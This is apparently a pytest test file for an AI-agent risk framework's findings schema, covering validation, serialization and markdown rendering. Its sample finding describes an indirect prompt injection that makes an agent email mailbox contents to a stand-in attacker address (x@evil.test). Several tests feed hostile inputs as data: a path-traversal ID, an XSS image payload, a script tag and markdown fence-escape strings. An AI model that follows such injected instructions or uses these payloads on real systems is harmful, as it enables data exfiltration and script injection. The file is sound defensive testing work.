from __future__ import annotations

import json
from datetime import UTC, datetime

import pytest

from agent_risk_framework.enums import DetectorVerdict, GuardrailAction, Severity
from agent_risk_framework.findings import (
    Evidence,
    Finding,
    FindingValidationError,
    load_finding,
    render_markdown,
    write_finding,
)

EXPECTED_FIELDS = {
    "finding_id",
    "title",
    "severity",
    "category",
    "asi_id",
    "llm_id",
    "mcp_id",
    "atlas_technique",
    "attack_case",
    "status",
    "description",
    "impact",
    "evidence",
    "detection_result",
    "guardrail_action",
    "recommendation",
    "timestamp",
}


def make(**overrides) -> Finding:
    base = dict(
        finding_id="ARF-0001",
        title="Indirect injection triggers email to attacker",
        severity="high",
        category="indirect_prompt_injection",
        asi_id="ASI01",
        llm_id="LLM01:2026",
        mcp_id=None,
        atlas_technique="AML.T0051.001",
        attack_case="AC09",
        status="open",
        description="A tool-returned email body redirected the agent's goal.",
        impact="Synthetic mailbox contents sent to an unapproved recipient.",
        evidence=(Evidence("tool_call", "send_email(to='x@evil.test')", run_id=3),),
        detection_result="not_detected",
        guardrail_action="none",
        recommendation="Scan tool output with the classifier; enforce a recipient allowlist.",
        timestamp=datetime(2026, 10, 27, tzinfo=UTC).isoformat(),
    )
    base.update(overrides)
    return Finding(**base)


def test_schema_has_exactly_the_specified_fields() -> None:
    assert set(make().to_dict()) - {"schema_version"} == EXPECTED_FIELDS


def test_strings_coerced_to_enums() -> None:
    f = make()
    assert f.severity is Severity.HIGH
    assert f.detection_result is DetectorVerdict.NOT_DETECTED
    assert f.guardrail_action is GuardrailAction.NONE


def test_roundtrip_json_dict() -> None:
    f = make(mcp_id="MCP03:2025")
    assert Finding.from_dict(json.loads(json.dumps(f.to_dict()))) == f


@pytest.mark.parametrize(
    ("field", "value"),
    [
        ("finding_id", "ARF-1"),
        ("finding_id", "../../etc/passwd"),
        ("finding_id", "ARF-\u0661\u0662\u0663\u0664"),  # Arabic-Indic digits
        ("finding_id", "ARF-" + "1" * 300),
        ("atlas_technique", "AML.T\uff10\uff10\uff15\uff11"),  # fullwidth digits
        ("asi_id", "ASI11"),
        ("asi_id", "LLM01"),
        ("llm_id", "LLM01:2025"),
        ("mcp_id", "MCP11:2025"),
        ("atlas_technique", "T0051"),
        ("severity", "urgent"),
        ("status", "closed"),
        ("detection_result", "maybe"),
        ("guardrail_action", "nuke"),
        ("title", "  "),
        ("timestamp", "2026-10-27T00:00:00"),  # naive
        ("timestamp", "yesterday"),
    ],
)
def test_invalid_values_rejected(field: str, value: str) -> None:
    with pytest.raises(FindingValidationError):
        make(**{field: value})


def test_from_dict_rejects_unknown_and_missing_fields() -> None:
    data = make().to_dict()
    with pytest.raises(FindingValidationError, match="unknown"):
        Finding.from_dict({**data, "cvss": 9.8})
    data.pop("impact")
    with pytest.raises(FindingValidationError):
        Finding.from_dict(data)
    with pytest.raises(FindingValidationError, match="schema_version"):
        Finding.from_dict({**make().to_dict(), "schema_version": 99})


def test_default_timestamp_is_utc_aware() -> None:
    data = make().to_dict()
    data.pop("timestamp")
    data.pop("schema_version")
    f = Finding.from_dict(data)
    assert datetime.fromisoformat(f.timestamp).tzinfo is not None


def test_write_finding_creates_json_and_markdown(tmp_path) -> None:
    f = make()
    json_path, md_path = write_finding(f, tmp_path / "findings")
    assert json_path.name == "ARF-0001.json"
    assert md_path.name == "ARF-0001.md"
    assert load_finding(json_path) == f
    md = md_path.read_text(encoding="utf-8")
    assert md.startswith("# ARF-0001: ")
    assert "| OWASP Agentic (primary) | ASI01 |" in md
    assert "| OWASP MCP (beta) | n/a |" in md
    assert "AML.T0051.001" in md
    assert b"\r\n" not in md_path.read_bytes()


def test_markdown_evidence_cannot_escape_its_fence() -> None:
    hostile = "```\n# Injected heading\n```"
    md = render_markdown(make(evidence=(Evidence("transcript_excerpt", hostile),)))
    assert "````text\n" + hostile + "\n````" in md


def test_markdown_table_cells_escape_pipes() -> None:
    md = render_markdown(make(category="a|b"))
    assert "| Category | a\\|b |" in md
    md = render_markdown(make(category="a\\|b"))
    assert "| Category | a\\\\\\|b |" in md  # backslash cannot un-escape the pipe


@pytest.mark.parametrize("brk", ["\n", "\r", "\r\n", "\u2028"])
def test_markdown_single_line_fields_cannot_inject_blocks(brk: str) -> None:
    hostile = f"AC-1{brk}# INJECTED{brk}<img src=x onerror=alert(1)>"
    md = render_markdown(make(attack_case=hostile, title=f"t{brk}# also injected"))
    assert "\n# INJECTED" not in md
    assert "\r" not in md
    assert "\n# also injected" not in md
    assert "<img" not in md
    assert "&lt;img src=x onerror=alert(1)&gt;" in md


@pytest.mark.parametrize(
    "evidence",
    [
        [{"kind": "tool_call", "content": 123}],
        [{"kind": None, "content": "x"}],
        [{"kind": "Tool Call\n# x", "content": "x"}],
        [{"kind": "tool_call", "content": "x", "run_id": "1)\n<script>"}],
        [{"kind": "tool_call", "content": "x", "run_id": True}],
        [{"kind": "tool_call", "content": "x", "extra": 1}],
        ["not an object"],
        "not a list",
    ],
)
def test_malformed_evidence_rejected_with_validation_error(evidence) -> None:
    with pytest.raises(FindingValidationError):
        Finding.from_dict({**make().to_dict(), "evidence": evidence})


def test_existing_finding_not_overwritten_by_default(tmp_path) -> None:
    write_finding(make(), tmp_path)
    with pytest.raises(FileExistsError):
        write_finding(make(title="replacement"), tmp_path)
    write_finding(make(title="replacement"), tmp_path, overwrite=True)
    assert load_finding(tmp_path / "ARF-0001.json").title == "replacement"


def test_unencodable_evidence_leaves_existing_finding_intact(tmp_path) -> None:
    write_finding(make(), tmp_path)
    broken = make(evidence=(Evidence("tool_call", "lone surrogate \ud800"),))
    with pytest.raises(UnicodeEncodeError):
        write_finding(broken, tmp_path, overwrite=True)
    assert load_finding(tmp_path / "ARF-0001.json") == make()
    assert sorted(p.name for p in tmp_path.iterdir()) == ["ARF-0001.json", "ARF-0001.md"]
